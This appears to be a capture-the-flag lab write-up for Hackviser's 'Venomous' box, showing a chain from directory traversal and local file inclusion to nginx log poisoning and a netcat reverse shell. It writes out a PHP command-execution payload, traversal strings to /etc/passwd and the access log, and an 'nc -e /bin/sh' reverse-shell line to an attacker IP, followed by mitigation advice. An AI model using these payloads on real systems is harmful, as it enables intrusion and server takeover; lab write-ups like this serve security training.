---
title: "Venomous: Directory Traversal → LFI → Log Poisoning → Reverse Shell"
date: 2026-03-29 23:59:00 +0530
categories: [Hackviser, Easy]
tags: [lfi, directory-traversal, log-poisoning, rce, nginx, reverse-shell]
platform: Hackviser
author: Shivansh Sharma
image:
  path: /assets/images/posts/lfi.webp
  alt: LFI to Log Poisoning Remote Code Execution
---

## Overview

This lab demonstrates a powerful exploitation chain involving:

- Directory Traversal
- Local File Inclusion (LFI)
- Log Poisoning
- Remote Code Execution (RCE)
- Reverse Shell

It highlights how file inclusion vulnerabilities can escalate into full system compromise.

---

## Objective

- Identify file inclusion vulnerability
- Read sensitive system files
- Poison server logs with malicious payload
- Execute commands via LFI
- Gain reverse shell access

---

## Reconnaissance

Scan the target for open services:

```bash
nmap -sV <target_ip>
```

**Output**

```
┌──(root㉿kali)-[/home/kelvin/Desktop]
└─# nmap -sV 172.20.6.136
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 13:05 -0400
Nmap scan report for 172.20.6.136 (172.20.6.136)
Host is up (0.19s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0

Nmap done: 1 IP address (1 host up) scanned in 12.64 seconds
```

Open service: Port **80** — HTTP (Nginx)

---

## Directory Enumeration

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/big.txt
```

**Output**

```
css
fonts
invoices
js
```

---

## Identifying LFI

Accessing the invoice feature:

```
http://<target_ip>/show-invoice.php?invoice=invoice-8741.html
```

The `invoice` parameter appears vulnerable to manipulation.

---

## Directory Traversal / LFI

Test for LFI using traversal payload:

```
http://<target_ip>/show-invoice.php?invoice=../../../../../../../../etc/passwd
```

**Result**

- Successfully retrieved `/etc/passwd`
- Confirms Local File Inclusion

---

## Log Poisoning

### Concept

Log poisoning involves injecting malicious code into server logs and then executing it via LFI.

### Injecting Payload into Logs

Connect to the web server:

```bash
nc <target_ip> 80
```

Send malicious HTTP request:

```
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
Host: <target_ip>

```

This payload gets stored in the Nginx access log.

### Executing Payload via LFI

Access the log file using LFI:

```
http://<target_ip>/show-invoice.php?invoice=../../../../../../../../var/log/nginx/access.log&cmd=id
```

**Result**

- Command executed successfully
- Output of `id` is displayed
- Confirms Remote Code Execution

---

## Reverse Shell

### Step 1: Start Listener

```bash
nc -lvp 1337
```

### Step 2: Inject Reverse Shell Payload

```bash
nc <target_ip> 80
```

Send:

```
GET /<?php passthru('nc -e /bin/sh <attacker_ip> 1337'); ?> HTTP/1.1
Host: <target_ip>
Connection: close
```

### Step 3: Trigger Execution

Visit:

```
http://<target_ip>/show-invoice.php?invoice=../../../../../../../../var/log/nginx/access.log
```

**Result**

- Reverse shell connection established
- Full command execution on target

---

## Proof of Exploitation

- LFI vulnerability confirmed
- Accessed sensitive system files
- Injected payload into server logs
- Achieved remote command execution
- Established reverse shell

---

## Attack Chain Summary

1. Service enumeration (Nmap)
2. Directory discovery (Gobuster)
3. LFI via `invoice` parameter
4. Read `/etc/passwd`
5. Log poisoning via crafted HTTP request
6. Execute commands via access log
7. Reverse shell via Netcat

---

## Impact

- Full remote code execution
- Unauthorized file system access
- Exposure of sensitive data
- Complete server compromise

---

## Mitigation

- Validate and sanitize user input
- Prevent directory traversal (`../`)
- Disable inclusion of user-controlled files
- Restrict access to log files
- Store logs outside web-accessible paths
- Disable execution of scripts in logs
- Use Web Application Firewall (WAF)

---

## Real-World Insight

LFI vulnerabilities are often underestimated but can lead to full compromise when combined with techniques like log poisoning.

Common exploitation path:

> LFI → Log Injection → Code Execution → Shell

This chain is frequently seen in real-world attacks against poorly configured web servers.

Always test:

- `../../etc/passwd`
- Log file inclusion
- Input reflection points

Small input validation issues can escalate into complete system takeover.